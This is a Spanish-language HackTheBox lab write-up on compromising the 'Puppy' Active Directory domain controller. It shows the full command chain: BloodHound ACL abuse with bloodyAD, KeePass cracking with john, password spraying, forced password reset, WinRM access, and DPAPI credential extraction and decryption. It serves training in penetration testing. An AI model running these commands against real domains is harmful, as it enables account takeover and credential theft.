Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #bloodhound #bloodyad #ad #acl #keepass #dpapi #rusthound 

![](assets/Pasted%20image%2020260109133818.png)

Credenciales Iniciales: levi.james / KingofAkron2025!
## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ ping -c 1 10.129.232.75
PING 10.129.232.75 (10.129.232.75) 56(84) bytes of data.
64 bytes from 10.129.232.75: icmp_seq=1 ttl=127 time=86.2 ms

--- 10.129.232.75 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 86.202/86.202/86.202/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.232.75 -oG nmap/allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
111/tcp   open  rpcbind          syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2049/tcp  open  nfs              syn-ack ttl 127
3260/tcp  open  iscsi            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos tiro un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ sudo nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49676 -sV -sC -Pn -n -sS -vvv 10.129.232.75 -oN nmap/target


Bug in iscsi-info: no string output.
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-10 02:42:03Z)
111/tcp   open  rpcbind?      syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
3260/tcp  open  iscsi?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32931/tcp): CLEAN (Timeout)
|   Check 2 (port 24360/tcp): CLEAN (Timeout)
|   Check 3 (port 19274/udp): CLEAN (Timeout)
|   Check 4 (port 49884/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-01-10T02:43:57
|_  start_date: N/A
|_clock-skew: 6h59m31s
```

Por la informacion que tengo puedo intuir que estoy contra un `DC`.

- Puerto 88 Kerberos
- Puerto 445,139 SMB
- Puerto 135 RPC
- Puerto 389 LDAP
- Puerto 5985 WinRm

## Enumeración

### Puerto 445 SMB

Saque info general de la maquina:

- dominio **puppy.htb**
- nombre de la maquina **DC**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ nxc smb 10.129.232.75
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
```

Metí eso al `/etc/hosts.`

```bash
10.129.232.75 DC DC.PUPPY.HTB PUPPY.HTB
```


Con mis credenciales voy a enumerar los recursos a los que tengo acceso.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ nxc smb DC.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --shares
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share
```

- levi.james tiene acceso a IPC$, NETLOGON y SYSVOL. Todos son recursos estándar, el único que me llama la atención es DEV pero no tenemos acceso.


### Puerto 135 RCP

Puedo conectarme por RPC para enumerar usuarios y grupos:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ rpcclient -U 'levi.james' puppy.htb
Password for [WORKGROUP\levi.james]:

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[HR] rid:[0x454]
group:[SENIOR DEVS] rid:[0x455]
group:[DEVELOPERS] rid:[0x459]
```

Tenemos los siguientes usuarios:

- levi.james (Nosotros)
- ant.edwards
- adam.silver
- jamie.williams
- Y al parecer 2 cuentas para un usuario: steph.cooper steph.cooper_adm

De grupos tenemos:

- HR. nuestro usuario levi.james pertenece a este grupo
- Senior Devs
- Developers. 

Tal vez si obtenemos acceso al grupo Developers o Senior Devs podremos tener acceso al recurso SMB **DEV**.

## Intrusion y Movimiento Lateral.

Con la informacion que tengo, voy a utilizar `bloodhound` para poder enumerar los ACLs del dominio.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Primero tenemos que utilizar un **Ingestor** para recopilar la info del domino, en mi caso utilice [rusthound-ce](https://github.com/g0h4n/RustHound-CE). 

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ ./rusthound-ce -d puppy.htb -u levi.james@puppy.htb -z
---------------------------------------------------
Initializing RustHound-CE at 19:57:52 on 01/09/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-01-09T19:57:52Z INFO  rusthound_ce] Verbosity level: Info
[2026-01-09T19:57:52Z INFO  rusthound_ce] Collection method: All
Password:
[2026-01-09T19:57:58Z INFO  rusthound_ce::ldap] Connected to PUPPY.HTB Active Directory!
[2026-01-09T19:57:58Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-01-09T19:57:58Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-09T19:57:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=PUPPY,DC=HTB
[2026-01-09T19:57:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-09T19:58:01Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=PUPPY,DC=HTB
[2026-01-09T19:58:01Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-09T19:58:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=PUPPY,DC=HTB
[2026-01-09T19:58:03Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-09T19:58:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=PUPPY,DC=HTB
[2026-01-09T19:58:03Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-09T19:58:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=PUPPY,DC=HTB
[2026-01-09T19:58:03Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-01-09T19:58:03Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::maker::common] 10 users parsed!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::maker::common] 64 groups parsed!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::maker::common] 3 ous parsed!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-01-09T19:58:03Z INFO  rusthound_ce::json::maker::common] .//20260109195803_puppy-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 19:58:03 on 01/09/26! Happy Graphing!
```

- Esto me genera un ZIP que puedo importar en `bloodhound`.

### GenericWrite sobre Developers.

Al importar el zip a bloodhound puedo ver lo siguiente:

- levi.james pertenece al grupo HR y el grupo HR tiene el derecho **GenericWrite** sobre el grupo **Developers.** Esto me permite agregar al usuario levi.james a dicho grupo.

![](assets/Pasted%20image%2020260109141402.png)

!!! info
    **GenericWrite** es un derecho ACL que permite modificar la mayoría de atributos de un objeto. En este caso, podemos: - Agregar/eliminar miembros del grupo - Modificar propiedades del grupo - Cambiar la descripción

Con `bloody-AD` puedo agregar el usuario al grupo:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host puppy.htb add groupMember Developers levi.james
[+] levi.james added to Developers
```

Ahora que somos parte del grupo **Developers** puedo volver a enumerar los shares del SMB para ver si ahora tengo acceso al recurso **DEV**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ smbmap -H 10.129.232.75 -u'levi.james' -p 'KingofAkron2025!')

[+] IP: 10.129.232.75:445       Name: DC                        Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     READ ONLY       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
```

- Tengo permisos de lectura en el share DEV.

Me voy a conectar al recurso para ver que contiene.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ smbclient //10.129.232.75/DEV -U 'levi.james'
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 07:07:57 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025
  
smb: \> get recovery.kdbx 
```

- En el recurso existía un archivo **recovery.kdbx** que corresponde a una **base de datos KeePass usada como bóveda de recuperación de credenciales**.

### Crackeando keepass.

Para crackear este archivo necesitamos usar la version actualizada de: [john](https://github.com/openwall/john)

Después de instalar la herramienta puedo utilizar `keepass2john` para generar un hash crackeable.

```bash
┌──(wndr㉿wndr)-[~/Tools/john/run]
└─$ ./keepass2john recovery.kdbx > kepass.hash
```

Ahora puedo crackear ese hash con `john`.

```bash
┌──(wndr㉿wndr)-[~/Tools/john/run]
└─$ ./john kepass.hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 37 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 4 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Failed to use huge pages (not pre-allocated via sysctl? that's' fine)

liverpool        (recovery)

1g 0:00:00:18 DONE (2026-01-09 20:32) 0.05376g/s 1.935p/s 1.935c/s 1.935C/s purple..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

- liverpool es la contraseña del archivo **recovery.kdbx**

Ahora puedo dumpear las credenciales del archivo **keepass**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy/content]
└─$ keepassxc-cli export -f html recovery.kdbx > dump.html

Enter password to unlock recovery.kdbx:
```

Y  obtenemos esto:

- Credenciales para distintos usuarios.

![](assets/Pasted%20image%2020260109143627.png)

Voy a guardarme estas credenciales en 2 archivos y voy a probarlas con `netexec` para ver cuales son validas:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ nxc smb 10.129.232.75 -u users.txt -p passwords.txt --continue-on-succes

SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\steph.cooper_adm:JamieLove2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:ILY2025! STATUS_LOGON_FAILURE
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:ILY2025! STATUS_LOGON_FAILURE
```

- La única que sirve es ant.edwards / Antman2025!

### GenericAll sobre adam.silver.

Ahora que tengo acceso como el usuario **ant.edwards** puedo ir devuelta a `bloodhound` para ver lo siguiente:

- ant.edwards es miembro del grupo **Senior Devs** que a su vez tiene el derecho **GenericAll** sobre el usuario adam.silver
- adam.silver es miembro de Remote Managment Users, lo que nos permite acceso a la maquina.

![](assets/Pasted%20image%2020260109144251.png)

Una de las formas de abusar de **GenericWrite** es realizar un cambio de contraseña sobre el usuario adam.silver. Esto lo podemos hacer con net rpc.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ net rpc password "adam.silver" 'wndr23$profortnite' -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S "puppy.htb"
```

Podemos probar las nuevas credenciales con `netexec`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ nxc smb 10.129.232.75 -u adam.silver -p 'wndr23$profortnite' --shares
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:wndr23$profortnite STATUS_ACCOUNT_DISABLED
```

- `netexec` nos indica que la cuenta esta deshabilitada.

De hecho BloodHound también nos lo indica, pero como soy ciego y no leo pues no lo vi.

![](assets/Pasted%20image%2020260109145051.png)

Podemos activar la cuenta con `bloodyAD`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ bloodyAD --host 10.129.232.75 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

Ahora con `netexec` voy a comprobar que la contraseña si se haya cambiado y que la cuenta esta habilitada.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ nxc winrm 10.129.232.75 -u adam.silver -p 'wndr23$profortnite'
WINRM       10.129.232.75   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.129.232.75   5985   DC               [+] PUPPY.HTB\adam.silver:wndr23$profortnite (Pwn3d!)
```

- Funciono

BloodHound me indica que este usuario es miembro del group **Remote Managmet User** asi que me conecto por WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ evil-winrm -i puppy.htb -u adam.silver -p 'wndr23$profortnite'

*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami
puppy\adam.silver
```
## Escalada de Privilegios

En cuanto a privilegio no tengo muchos.

```bash
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

En tema de grupos tampoco tengo nada raro.

```bash
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
PUPPY\DEVELOPERS                            Group            S-1-5-21-1487982659-1829050783-2281216199-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
```

Lo único que pude encontrar un ZIP el cual me descargue:

```bash
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip
```

Al momento de descomprimir el ZIP me tope con un archivo `nms-auth-config.xml.bak` el cual inspeccione.

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/puppy/content/puppy]
└─$ ls -la
total 28
drwxr-xr-x 4 wndr wndr 4096 Dec 31  1979 .
drwxrwxr-x 3 wndr wndr 4096 Jan 10 05:54 ..
drwxrwxr-x 6 wndr wndr 4096 Dec 31  1979 assets
drwxrwxr-x 2 wndr wndr 4096 Dec 31  1979 images
-rw-rw-r-- 1 wndr wndr 7258 Dec 31  1979 index.html
-rw-r--r-- 1 wndr wndr  864 Dec 31  1979 nms-auth-config.xml.bak

┌──(wndr㉿wndr)-[~/…/hackthebox/puppy/content/puppy]
└─$ \cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

- Encontré las credenciales: steph.cooper / ChefSteph2025!

Gracias a bloodhound se que este usuario pertenece a **Remote Managment Users** por lo cual puedo conectarme via WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy]
└─$ evil-winrm -i puppy.htb -u steph.cooper -u 'ChefSteph2025!'
```

En cuanto a privilegios y a grupos la verdad es que no tengo nada raro:

```bash
*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users> net user steph.cooper
User name                    steph.cooper
Full Name                    Stephen W. Cooper
Comment
User's' comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/19/2025 4:21:00 AM
Password expires             Never
Password changeable          2/20/2025 4:21:00 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               C:\Users\Steph.cooper
Last logon                   3/8/2025 7:40:35 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

### Descifrando DPAPI

Me decidí por checar si existían archivos protegidos por DPAPI y me encontré con lo siguiente:

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> dir -Force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

- Este archivo corresponde a blob cifrado (una credencial) protegida por DPAPI

!!! info
    **DPAPI** (**Data Protection API**) es un **mecanismo de Windows para cifrar secretos de forma automática**, ligado al **usuario o al sistema**.

    DPAPI protege secretos como
    
    - Credenciales para RDP, SMB, WinRM,
    - Certificados
    - Credenciales de Navegadores y Microsoft Vaults.

    Las rutas tipicas de DPAPI suele ser:

    - `C:\Users\<user>\AppData\Roaming\Microsoft\Protect\` - MasterKey
    - `C:\Users\<user>\AppData\Local\Microsoft\Credentials\`
    - `C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\`

También encontré la master key.

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect> dir -Force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107
```

- Este archivo corresponde a la master key del usuario steph.cooper y la podemos usar para descifrar el archivo protegido por DPAPI.


Voy a transferirme los archivos codificándolos en base64

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> [Convert]::ToBase64String((Get-Content -path "556a2412-1275-4ccf-b721-e6a0b4f90407" -Encoding byte))
AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=

*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9'))
AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYPSiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc
```

Estos 2 archivos los voy a descodificar y guardar con el nombre original en mi maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy/content]
└─$ echo "<BASE64 DEL ARCHIVO>" | base64 -d > archivo
```

Con `impacket-dpapi` voy a descifrar la master key pasándole el SID y el archivo de la master key.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy/content]
└─$ impacket-dpapi masterkey -file 56a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
